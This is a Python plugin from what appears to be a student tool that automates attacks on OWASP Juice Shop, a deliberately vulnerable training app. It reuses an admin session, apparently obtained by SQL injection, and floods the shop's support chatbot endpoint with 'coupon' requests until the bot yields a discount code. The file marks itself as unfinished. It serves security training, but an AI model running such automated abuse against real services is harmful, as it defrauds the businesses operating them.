# SOURCE FILE:    get_coupon.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing BULLY CHATBOT challenge (NOT WORKING YET)
#                 We can send the COUPON message to the supporter machine several times, until it gives us COUPON
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song, Yoyo Wang
#
# NOTES:
# Has some bug
# We need to use browser to open CHATBOT before running this plugin.
# Otherwise, the CHATBOT will always responds us "not recgnized who you are."
#--------------------------------------------------------------------------------------
import time
from plugins import attack as a

#--------------------------------------------------------------------------------------
#Class: get_coupon
#Inherit: Attack
#--------------------------------------------------------------------------------------
class get_coupon(a.attack_inter):

#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables(REST session; url_who, URL).
#--------------------------------------------------------------------------------------
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url_who = a.URL + '/rest/user/whoami'
        self.url = a.URL + '/rest/chatbot/respond'

#--------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data, cookie, header
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
# ALL REST requests needed data like json_data, header, and cookie must generated through this function
#--------------------------------------------------------------------------------------
    def generator(self):
        cookie, header= a.get_auth('admin')
        json_data = {
            'action': "setname",
            'query': 'coupon',
        }

        return json_data, cookie,header

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log',
                           level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        
        a.logging.info('#Get Coupon Started')
        json_data, cookie,header = self.generator()
        response = self.juice_session.post(self.url, json = json_data, cookies= cookie, headers=header)
        new_json_data = {
            'action': 'query',
            'query': 'coupon',
        }
        print(response.text)
        if cookie:
            print('hello')
            while (response.text.find("stop nagging me") == -1 ):
                response = self.juice_session.post(self.url, json = new_json_data, cookies=cookie, headers=header)
                print(response.text)
            print("we found coupon:")
            print(response.text)
            a.logging.info('#Get Coupon Finished')
        else:
            print("Not have authentification yet, please try SQL injection first")
            a.logging.info('#Get Coupon Finished')